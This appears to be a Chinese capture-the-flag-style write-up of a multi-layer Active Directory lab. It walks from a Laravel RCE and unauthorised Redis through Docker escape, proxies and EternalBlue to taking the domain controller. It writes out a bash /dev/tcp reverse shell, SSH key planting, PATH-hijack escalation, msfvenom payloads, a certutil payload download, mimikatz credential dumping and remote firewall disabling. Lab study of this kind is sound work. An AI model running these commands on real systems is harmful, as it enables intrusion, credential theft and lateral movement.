## 前言

红日的第七个靶场链接如下：<http://vulnstack.qiyuanxuetang.net/vuln/detail/9/>，整个靶场的网络环境分为三层，从最初的信息收集、外网初探、攻入内网、搭建代理、横向移动，最终拿下域控。

搭建完成后访问172.20.10.4，发现是一个博客页面

![](https://image.3001.net/images/20211230/1640833430_61cd219658fb6cc7f700d.png!small)

对目标ip进行端口扫描发现还开启了22，81，6379端口![](https://image.3001.net/images/20211230/1640833451_61cd21ab3be4634d9c7b1.png!small)

访问81端口发现是个Larvel的站点，版本v8.29.0存在远程代码执行漏洞，可以拿exp打一下![](https://image.3001.net/images/20211230/1640833474_61cd21c210e9bffd9c25e.png!small)

使用脚本getshell，工具地址：<https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP>![](https://image.3001.net/images/20211230/1640833540_61cd22049b10521c35b64.png!small)

这里使用哥斯拉直接连接就可以(这里注意的是要使用低版本的哥斯拉进行连接，因为高版本的哥斯拉生成的马的加密方式已经改变了导致会连接失败)。![](https://image.3001.net/images/20211230/1640833562_61cd221a96884d46cf69f.png!small)

使用哥斯拉执行命令回显有点问题，就又写了一个php一句话换成了用蚁剑进行连接，发现当前的shell处于docker容器中，反弹shell也失败了。![](https://image.3001.net/images/20211230/1640833574_61cd2226b2bd3dc65a59b.png!small)

那来看下6379端口的redis有没有未授权，kali直接连接发现存在redis未授权。![](https://image.3001.net/images/20211230/1640833585_61cd22310adf3e76fcefa.png!small)

直接往目标主机上写ssh公钥

    
    
    ssh-keygen -t rsa(echo -e "\n\n"; catid_rsa.pub; echo -e "\n\n") > 1.txtcat 1.txt | redis-cli -h 172.20.10.4-x set crack

![](https://image.3001.net/images/20211230/1640842152_61cd43a85a4abf05c15fd.png!small)

然后连接redis执行命令

    
    
    config set dir /root/.ssh   #设置config set dbfilenameauthorized_keyssave

![](https://image.3001.net/images/20211230/1640833606_61cd2246e45a809e67a5b.png!small)

写入成功后，ssh进行连接，发现目标主机还存在另外一网段192.168.52.1/24![](https://image.3001.net/images/20211230/1640833616_61cd225013b890af70fa6.png!small)

查看主机的基本信息发现存在nginx代理服务，发现我们前面访问的80端口，nginx服务将其转发给了47.117.125.220而81端口的请求转发给了第二层网络的web服务器192.168.52.20。![](https://image.3001.net/images/20211230/1640833629_61cd225d5bf3151977ee2.png!small)

我们先将前面Larvel的shell反弹给web1(192.168.52.10),然后获取一个交互式shell：

    
    
    bash -c 'exec bash -i >&/dev/tcp/192.168.52.10/1234 0>&1'nc -lvp 1234python -c 'importpty;pty.spawn("/bin/bash")'Ctrl-Zstty raw -echofg

![](https://image.3001.net/images/20211230/1640833643_61cd226b57791357d38ab.png!small)

前面已经知道当前的shell是在docker容器中，当前用户为www-data，我们要想办法提权，这里利用环境变量来提权，直接使用find命令来搜索具有SUID或4000权限的文件，在这里发现一个在/home/jobs目录下有一个shell文件，执行该文件发现该文件执行了ps命令并且未使用绝对路径。![](https://image.3001.net/images/20211230/1640833658_61cd227a01bf8900b9e0f.png!small)

更改$PATH来执行我们的恶意程序，从而获得目标主机的高权限shell

    
    
    cd /tmpecho "/bin/bash" > pschmod 777 psecho $PATHexport PATH=/tmp:$PATH #将/tmp添加到环境变量中，并且先加载执行/tmp里的程序cd /home/jobs./shell

![](https://image.3001.net/images/20211230/1640834443_61cd258b7a512b03a5763.png!small)

这个我们已经获取到root权限了，接下来就是要进行docker逃逸

    
    
    fdisk -l #查看磁盘文件mkdir chanmount /dev/sda1 /chan    #将/dev/sda1挂载到创建的文件夹ls /chan

![](https://image.3001.net/images/20211230/1640834477_61cd25ad9b47d08f527ce.png!small)

发现home目录下有unbuntu用户，可以生成ssh密钥写入到/chan/home/ubuntu/.ssh目录中的authorized_keys文件中，写入成功之后就可以使用该密钥登陆到该机器上。![](https://image.3001.net/images/20211230/1640834511_61cd25cf61b503ceb2a5e.png!small)

    
    
    ssh-keygen -f chanchmod 600 chan    #赋予权限

![](https://image.3001.net/images/20211230/1640834540_61cd25ec707cf4ffa15bc.png!small)

    
    
    cp -avx /chan/home/ubuntu/.ssh/id_rsa.pub/chan/home/ubuntu/.ssh/authorized_keys #-avx是将权限也一起复制echo > /chan/home/ubuntu/.ssh/authorized_keys  #清空authorized_keys文件echo '生成的.pub文件的内容' > /chan/home/ubuntu/.ssh/authorized_keys  #将ssh秘钥写入authorized_keys文件

![](https://image.3001.net/images/20211230/1640834592_61cd26206ab44058d7687.png!small)

成功登录，系统未ubuntu，还存在192.168.93.1/24网段![](https://image.3001.net/images/20211230/1640834608_61cd2630d99e5d80838bc.png!small)![](https://image.3001.net/images/20211230/1640834621_61cd263d78d4e1809d5c6.png!small)

利用内核提权漏洞CVE-2021-3493进行提权![](https://image.3001.net/images/20211230/1640834641_61cd2651097f71fd7324a.png!small)

至此已经成功拿下了这两台机器，如下：

    
    
    web1：172.20.10.4       192.168.52.10web2:  192.168.52.20     192.168.93.10

下面开始上线msf,生成两个elf文件

    
    
    msfvenom -plinux/x64/meterpreter/bind_tcp LHOST=172.20.10.5 LPORT=5555 -f elf -o web1.elfmsfvenom -plinux/x64/meterpreter/bind_tcp LPORT=5555 -f elf -o web2.elf

![](https://image.3001.net/images/20211230/1640834669_61cd266d3fc1fb5843249.png!small)

在web1上将两个文件下载下来，执行web1.elf文件![](https://image.3001.net/images/20211230/1640834684_61cd267c87d0a735800ef.png!small)

此时msf已经接收到web1的session,添加路由![](https://image.3001.net/images/20211230/1640834702_61cd268e5bc8872531c05.png!small)

web1使用python3开启http服务
web2远程下载并执行we2.elf文件,此时两台机器已上线msf![](https://image.3001.net/images/20211230/1640834723_61cd26a3e1f267f6e9bdc.png!small)

对192.168.52.0段进行存活主机扫描，发现存在192.168.52.30![](https://image.3001.net/images/20211230/1640834739_61cd26b33ec951c64c6fc.png!small)

对该主机进行端口扫描如下，发现开启了445端口![](https://image.3001.net/images/20211230/1640834750_61cd26be635a7af81cf32.png!small)

使用msf的永恒之蓝模块攻击失败![](https://image.3001.net/images/20211230/1640834764_61cd26ccb7e6e4017ff5b.png!small)

发现192.168.52.30还开放了8080端口，配置代理然后访问一下

    
    
    #使用ew配置./ew_for_linux64 -s rcsocks -l 1080-e 1234     #攻击机执行vim /etc/proxychains4.confsocks5 127.0.0.1 1080nohup ./ew_for_linux64 -s rssocks -d172.20.10.5-e 1234 &     #web1执行

配置好代理后访问8080发现是个通达OA经测试其版本为通达OA
V11.3这个版本未授权文件上传、文件包含等漏洞。![](https://image.3001.net/images/20211230/1640834792_61cd26e84fceb171dadf5.png!small)

直接抓包，修改数据包来未授权上传图片马，这里路径为/2112/1345204797.jpg(这里burp也要进行socks代理)。![](https://image.3001.net/images/20211230/1640834810_61cd26fa1c3a9374523eb.png!small)

文件包含图片马来执行命令,发现也存在另外一个ip192.168.93.20![](https://image.3001.net/images/20211230/1640834828_61cd270cb4cadcfa941f6.png!small)

既然可以执行命令来了，生产一个exe木马然后直接上线msf上传到web1，win7远程从web1开启的http服务上将chan.exe下载下来。

    
    
    msfvenom -p windows/meterpreter/bind_tcpLPORT=7777 -f exe -o chan.exepython3 -m http.server 8088 #ertutil.exe -urlcache -split -f http://192.168.52.10:8088/chan.exeC:\MYOA\webroot\ispirit\interface\chan.exe

![](https://image.3001.net/images/20211230/1640834859_61cd272bcab26c872d75a.png!small)

执行exe成功返回session![](https://image.3001.net/images/20211230/1640834875_61cd273ba34c96b69ac82.png!small)

至此已经拿下第三台机器，经过信息搜集发现域控为192.168.93.30

使用meterpreter上的kiwi模块尝试抓取域用户及域管理员的密码

    
    
    load kiwikiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonPasswords

![](https://image.3001.net/images/20211230/1640834917_61cd2765430865965ad23.png!small)![](https://image.3001.net/images/20211230/1640834935_61cd277749736b5449f72.png!small)

在第二层网络Windows服务器的meterpreter中添加一个通往192.168.93.1/24网段的路由![](https://image.3001.net/images/20211230/1640834964_61cd279461080d794419c.png!small)

对192.168.93.0网段进行存活主机扫描，发现存在192.168.93.30
192.168.93.40![](https://image.3001.net/images/20211230/1640834981_61cd27a5c6238ee1ffe84.png!small)

使用msf永恒之蓝的扫描模块对这两台机器进行扫描，发现存在永恒之蓝漏洞![](https://image.3001.net/images/20211230/1640835007_61cd27bfba605b9690856.png!small)

利用msf模块进行攻击，只有192.168.93.40这台机器成功了![](https://image.3001.net/images/20211230/1640835046_61cd27e605c8f26c99238.png!small)

至此已经拿下四台主机：  
![](https://image.3001.net/images/20211230/1640835071_61cd27ff5c7ad5fa1026a.png!small)

我们登录到192.168.93.40这台机器上，我们前面已经获取到了域管理员的账号密码，直接与域控建立ipc连接

    
    
    net use \\192.168.93.30\ipc$"Whoami2021" /user:"Administrator"然后执行如下命令，使用sc远程在域制器（192.168.93.30）上创建服务关闭防火墙：sc \\192.168.93.30 create enfirewallbinpath= "netsh advfirewall set allprofiles state off"sc \\192.168.93.30 start enfirewall

![](https://image.3001.net/images/20211230/1640835099_61cd281bf1af260243bfe.png!small)

使用msf的 exploit/windows/smb/psexec 模块即可成功登录

![](https://image.3001.net/images/20211230/1640835125_61cd28356d206c72d1394.png!small)

成功拿下域控，至此三层网络结构中的五台机器已经全部拿下了![](https://image.3001.net/images/20211230/1640835187_61cd28737eaa74838712a.png!small)

这里拿师傅的图来展示一下网络结构：

![](https://image.3001.net/images/20211230/1640835198_61cd287eeed2ba3915fc1.png!small)

##  **总结**

通过此次靶场的练习，学习了Laravel远程代码执行、通达OA
v11.3的漏洞利用、ssh密钥的利以及sudo权限提升，三层网络代理等。这里应该还有其他的姿势，等后面在研究研究。  
  

